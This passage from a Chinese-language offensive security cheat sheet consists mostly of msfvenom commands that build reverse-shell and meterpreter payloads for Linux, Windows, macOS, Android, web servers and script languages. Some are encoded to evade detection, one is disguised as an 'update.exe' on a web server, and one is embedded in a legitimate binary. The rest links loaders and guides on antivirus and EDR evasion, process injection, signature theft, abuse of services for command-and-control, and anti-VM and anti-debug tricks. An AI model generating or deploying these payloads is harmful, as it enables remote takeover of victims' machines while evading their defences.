exploit -j -z
```
##### binaries
**linux**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f elf > shell.elf
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f elf -o x86_linux.elf
msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f elf -o x6_4linux.elf
msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf-so -o payload.so
```
**windows**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f exe > ./vu.exe
msfvenom --payload windows/meterpreter/reverse_tcp LHOST=********* LPORT=8080 -f exe --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.226 LPORT=6666 -a x86 --platform Windows -f dll >x86.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.3.226 LPORT=6666 --platform Windows -f dll >x64.dll
```
**mac**
```bash
msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip  lport=your-port -f macho > shell.macho
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f macho -o payload.macho
```
**android**
```bash
msfvenom -p android/meterpreter/shell_reverse_tcp lhost=your-ip  lport=your-port -f apk > shell.apk
```
##### web
**php**
```bash
msfvenom -p php/meterpreter_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.php
cat shell.php | pbcopy && echo ' shell.php && pbpaste >> shell.php
```
**asp**
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f asp > shell.asp
```
**Aspx**
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f aspx -o payload.aspx
```
**jsp**
```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f raw > shell.jsp
```
**war**
```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=your-ip lport=your-port -f war > shell.war
```
**javascript**
```bash
msfvenom -p windows/shell_reverse_tcp lhost=your-ip lport=your-port -f js_le -e generic/none
msfvenom -p linux/x86/shell_reverse_tcp lhost=your-ip lport=your-port CMD=/bin/bash -f js_le -e generic/none
```
**Nodejs**
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.js
```
##### scripting
**python**
```bash
msfvenom -p cmd/unix/reverse_python lhost=your-ip lport=your-port -f raw > shell.py
msfvenom -p python/shell_reverse_tcp lhost=your-ip lport=your-port -f raw
```
**jar**
```bash
msfvenom -p java/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f raw -o shell.jar
```
**bash**
```bash
msfvenom -p cmd/unix/reverse_bash lhost=your-ip lport=your-port -f raw > shell.sh
```
**perl**
```bash
msfvenom -p cmd/unix/reverse_perl lhost=your-ip lport=your-port -f raw > shell.pl
```
**vbscript**
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port exitfunc=thread -f vbs -a x86 --platform windows > shell.vbs
C:\Documents and Settings\Administrator>cscript shell.vbs
```
**Powershell**
```bash
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST= LPORT= -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1
msfvenom -a x64 --platform windows -p windows/x64/powershell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -e cmd/powershellbase64 -i 3 -f raw -o x64_shell.ps1
```
**Ruby**
```bash
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.rb
```
**Lua**
```bash
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.226 LPORT=8888 -f raw -o payload.lua
```
##### shellcode
**linux based shellcode**
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f 
```
**windows based shellcode**
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=your-ip lport=your-port -f 
```
**mac based shellcode**
```bash
msfvenom -p osx/x86/shell_reverse_tcp lhost=your-ip lport=your-port -f 
```
---
#### msfencode
```bash
msfvenom windows/shell_reverse_tcp lhost=your-ip lport=your-port R -e x86/shikata_ga_nai -t exe -c -9 -x /usr/share/windows-binaries/plink.exe(载体) -o ./shell.exe
```
### Payload Generation
**相关工具**
- [mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)
- [mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)
- [tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
- [TheWover/donut](https://github.com/TheWover/donut)
- [KINGSABRI/DotNetToJScriptMini](https://github.com/KINGSABRI/DotNetToJScriptMini)
### Loader
**相关文章**
- [CS免杀-Shellcode Loader原理(python)](https://mp.weixin.qq.com/s/-WcEW1aznO2IuCezkCe9HQ)
- [CS免杀-环境和编码补充(python)](https://mp.weixin.qq.com/s/_uMFatf4_yfGit-Xu7Ml9A)
- [利用加载器以及Python反序列化绕过AV](https://www.echocipher.life/index.php/archives/648/)
- [利用Python反序列化运行加载器实现免杀](https://my.oschina.net/u/4581868/blog/4380404)
- [shellcode加载总结](https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html)
- [从剖析CS木马生成到开发免杀工具](https://www.anquanke.com/post/id/210001)
**相关工具**
- C/C++
    - [knownsec/shellcodeloader](https://github.com/knownsec/shellcodeloader)
    - [clinicallyinane/shellcode_launcher](https://github.com/clinicallyinane/shellcode_launcher)
    - [DimopoulosElias/SimpleShellcodeInjector](https://github.com/DimopoulosElias/SimpleShellcodeInjector)
    - [lengjibo/FourEye](https://github.com/lengjibo/FourEye)
    - [1y0n/AV_Evasion_Tool](https://github.com/1y0n/AV_Evasion_Tool)
- go
    - [brimstone/go-shellcode](https://github.com/brimstone/go-shellcode)
- misc
    - [Gality369/CS-Loader](https://github.com/Gality369/CS-Loader) - 远程 shellcode+RC4
    - [Arno0x/ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper)
### 进程注入
**相关资源**
- [sud01oo/ProcessInjection](https://github.com/sud01oo/ProcessInjection) - Some ways to inject a DLL into a alive process
#### Reflection Injection
**相关资源**
- [stephenfewer/ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
**相关文章**
- [深入理解反射式dll注入技术](https://mp.weixin.qq.com/s/kVpesy_w7XLanL_WhRhn-Q)
### Platform
> 各类平台的服务滥用
#### C2用途
- [mttaggart/OffensiveNotion](https://github.com/mttaggart/OffensiveNotion) - Notion as a platform for offensive operations
- [D1rkMtr/VirusTotalC2](https://github.com/D1rkMtr/VirusTotalC2) - Abusing VirusTotal API to host our C2 traffic, usefull for bypassing blocking firewall rules if VirusTotal is in the target white list , and in case you don't have C2 infrastructure , now you have a free one
#### 文件分发
- [利用NPM仓库充当文件托管服务](https://mp.weixin.qq.com/s/THbjQphUwelO0gSrsEz5IQ)
#### Serverless
- AWS Lambda
- Cloudflare Workers
- 腾讯云 云函数SCF
### 工具开发
- [汇编万岁之1KB的downloader](https://www.freebuf.com/sectool/325444.html)
### 对抗
**相关项目**
- [optiv/Freeze](https://github.com/optiv/Freeze) - Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods
- [echtdefault/Janus](https://github.com/echtdefault/Janus)
**相关资源**
- [Writing Tiny, Efficient, And Reliable Malware by Rad Kawar](https://www.youtube.com/watch?v=TfG9lBYCOq8)
    - https://github.com/rad9800/WTSRM
**相关文章**
- [回忆杀-特征码免杀](https://uknowsec.cn/posts/notes/%E5%9B%9E%E5%BF%86%E6%9D%80-%E7%89%B9%E5%BE%81%E7%A0%81%E5%85%8D%E6%9D%80.html)
- [CobaltStrike与免杀初探](https://mp.weixin.qq.com/s/pHFBk01ed_Gy1K_3UJVc3g)
- [The difference between signature-based and behavioural detections](https://s3cur3th1ssh1t.github.io/Signature_vs_Behaviour/)
#### DLL 劫持
- [DLL 劫持](../OS安全/Windows安全.md#dll-劫持)
#### 签名
**相关文章**
- [SigFlip:将数据隐写到已签名的PE文件上](https://mp.weixin.qq.com/s/aOyNgfp6oHCNS8JqrradkQ)
- [识别SigFlip生成的恶意文件](https://hacktech.cn/2021/12/10/identify-sigflip-file/)
**相关工具**
- [Tylous/Limelighter](https://github.com/Tylous/Limelighter)
- [secretsquirrel/SigThief](https://github.com/secretsquirrel/SigThief)
- [med0x2e/SigFlip](https://github.com/med0x2e/SigFlip)
#### 虚拟化检测
**相关项目**
- [LordNoteworthy/al-khaser](https://github.com/LordNoteworthy/al-khaser) - Public malware techniques used in the wild: Virtual Machine, Emulation, Debuggers, Sandbox detection.
- [a0rtega/pafish](https://github.com/a0rtega/pafish) - Pafish is a testing tool that uses different techniques to detect virtual machines and malware analysis environments in the same way that malware families do
- [p3tr0v/chacal](https://github.com/p3tr0v/chacal) - Golang anti-vm framework for Red Team and Pentesters
**相关文章**
- [虚拟化平台检测](https://mp.weixin.qq.com/s/qKsFP_2V76qBRVFTQ9R_Cw)
    - https://github.com/Ast1rtes/check-virtual-machine
- [浅谈VMware环境去虚拟化](https://www.esw.ink/1114.html)
- [[原创]虚拟机检测技术剖析](https://bbs.pediy.com/thread-119969.htm)
- [攻击技术研判 | 改进的反虚拟机反调试技术](https://mp.weixin.qq.com/s/4ND7kC-_CTL1QWllJKQDjA)
**几种思路**
- 查询 I/O 通信端口
- 通过 MAC 地址检测
- CPUID 检测
- 通过主板序列号、型号、系统盘所在磁盘名称等其他硬件信息
- 特定进程检测
- 注册表检测
- 服务检测
- 文件路径检测
- 时间差检测
- 内存大小
#### 反调试
**相关项目**
- [strivexjun/XAntiDebug](https://github.com/strivexjun/XAntiDebug) - VMProtect 3.x Anti-debug Method Improved